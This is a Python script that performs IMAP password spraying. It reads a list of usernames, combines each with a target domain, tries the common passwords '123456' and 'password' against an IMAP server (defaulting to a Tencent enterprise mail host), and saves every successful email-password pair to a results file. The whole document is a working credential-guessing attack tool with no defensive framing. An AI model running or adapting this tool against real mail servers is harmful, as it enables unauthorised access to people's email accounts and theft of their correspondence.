import imaplib
import time
import logging
import argparse
import os,sys
if sys.version[0] < '3':
    reload(sys)
    sys.setdefaultencoding('utf8')

logger = logging.getLogger(__name__)
logger.setLevel(level = logging.INFO)
handler = logging.FileHandler("logs.txt")
handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)

target_pass = ["123456","password"]

def read_file_lines(file_path):
    with open(file_path) as fp:
        return fp.readlines()

def imap_auth(username, password):
    global host,port
    try:
        server = imaplib.IMAP4_SSL(host, port)
    except Exception as e:
        server = imaplib.IMAP4(host, port)
    try:
        ret = server.login(username, password)
    except Exception as e:
        ret = ["ERROR",str(e)]
    return ret

def parser_error(errmsg):
    print("Usage: python " + sys.argv[0] + " [Options] use -h for help")
    sys.exit()

def parse_args():
    parser = argparse.ArgumentParser(epilog="")
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-s', '--server', help="imap host", default="imap.exmail.qq.com",required=False)
    parser.add_argument('-p', '--port', help="port", default=993,required=False)
    parser.add_argument('-d', '--domain', help="domain", default="",required=True)
    parser.add_argument('-u', '--user', help="user", default="email.txt",required=False)
    parser.add_argument('-o', '--output', help='save the result to text file', nargs='?', default="result.txt",required=False)
    return parser.parse_args()

args = parse_args()
host = args.server
port = int(args.port)
domain = args.domain
user = args.user
output = args.output

user_list = []
if os.path.exists(user):  
    user_list = read_file_lines(user)
else:
    user_list.append(user)

f = open(output,"a")

for password in target_pass:
    for username in user_list:
        time.sleep(1)
        username = username.strip('\n')
        email = "%s@%s" % (username,domain)
        try:
            print("Testing: %s@%s:%s" %(username,domain,password))
            recv = imap_auth(email, password)
            if recv[0] == 'OK':
                print('Success:%s:%s' % (email, password))
                f.write("%s:%s\n" % (email,password))
                f.flush()
            else:
                logger.info('Error: %s. %s:%s' % (recv[1], email, password))
        except Exception as e:
            logger.info(e)
f.close()